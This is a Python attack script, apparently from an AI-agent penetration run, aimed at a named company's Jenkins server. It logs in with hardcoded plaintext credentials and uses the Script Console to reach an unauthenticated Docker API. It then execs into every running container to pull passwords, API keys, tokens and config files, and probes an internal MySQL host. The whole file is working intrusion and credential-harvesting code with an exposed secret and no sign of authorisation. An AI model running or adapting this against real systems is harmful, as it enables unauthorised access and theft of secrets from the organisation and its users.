# kimi2_docker_exec.py — Jenkins Script Console -> unauthenticated Docker API 172.27.140.148:4243
# Tasks: 1) list containers  2) exec secret-hunt per running container  3) QA DB reachability
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, sys, time

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')

TASK1 = r'''
def r = ["bash","-c","curl -s http://172.27.140.148:4243/containers/json?all=true"].execute().text
println r
'''

TASK2 = r'''
def r = ["bash","-c","""
DOCKER=http://172.27.140.148:4243
# Get running containers
CONTAINERS=\$(curl -s \$DOCKER/containers/json | python -c "import sys,json;[sys.stdout.write(c['Id'][:12]+'\\n') for c in json.load(sys.stdin)]")
for CID in \$CONTAINERS; do
 echo "=== Container: \$CID ==="
 # Create exec
 EXEC_ID=\$(curl -s -X POST \$DOCKER/containers/\$CID/exec -H 'Content-Type: application/json' -d '{"Cmd":["sh","-c","cat /etc/hostname; echo ---; env | grep -i 'pass\\|key\\|secret\\|token\\|mongo\\|mysql\\|redis\\|api' | sort; echo ---; find / -name '.env' -o -name '*.properties' 2>/dev/null | head -10"],"AttachStdout":true,"AttachStderr":true}' | python -c "import sys,json;print json.load(sys.stdin)['Id']")
 # Start exec
 curl -s -X POST \$DOCKER/exec/\$EXEC_ID/start -H 'Content-Type: application/json' -d '{"Detach":false,"Tty":false}' 2>/dev/null
 echo
done"""].execute().text
println r
'''

TASK3 = r'''
def r = ["bash","-c","""
DOCKER=http://172.27.140.148:4243
CONTAINERS=\$(curl -s \$DOCKER/containers/json | python -c "import sys,json;[sys.stdout.write(c['Id'][:12]+'\\n') for c in json.load(sys.stdin)]")
for CID in \$CONTAINERS; do
 EXEC_ID=\$(curl -s -X POST \$DOCKER/containers/\$CID/exec -H 'Content-Type: application/json' -d '{"Cmd":["sh","-c","timeout 3 bash -c \"echo Q | openssl s_client -connect 172.27.141.15:3306 2>/dev/null\" || timeout 3 bash -c \"echo | nc -w2 172.27.141.15 3306 2>/dev/null\" || echo UNREACHABLE"],"AttachStdout":true,"AttachStderr":true}' | python -c "import sys,json;print json.load(sys.stdin).get('Id','FAIL')")
 if [ "\$EXEC_ID" != "FAIL" ]; then
  echo "=== \$CID -> 172.27.141.15:3306 ==="
  curl -s -X POST \$DOCKER/exec/\$EXEC_ID/start -H 'Content-Type: application/json' -d '{"Detach":false,"Tty":false}' 2>/dev/null
 fi
done"""].execute().text
println r
'''

def run(name, script):
    print('=' * 78)
    print('### %s  [%s]' % (name, time.strftime('%H:%M:%S')))
    print('=' * 78)
    try:
        out = jenkins_exec(script)
    except Exception as e:
        out = 'ERROR: %r' % (e,)
    print(out)
    sys.stdout.flush()
    return out

if __name__ == '__main__':
    results = {}
    results['task1_containers'] = run('TASK 1 — LIST ALL CONTAINERS (all=true)', TASK1)
    results['task2_secrets'] = run('TASK 2 — SECRET HUNT PER RUNNING CONTAINER', TASK2)
    results['task3_qadb'] = run('TASK 3 — QA DB 172.27.141.15:3306 REACHABILITY', TASK3)
    with open(r'c:\xampp\htdocs\pentagi\claroshop_attack\kimi2_docker_exec_results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print('=' * 78)
    print('DONE — results saved to kimi2_docker_exec_results.json')
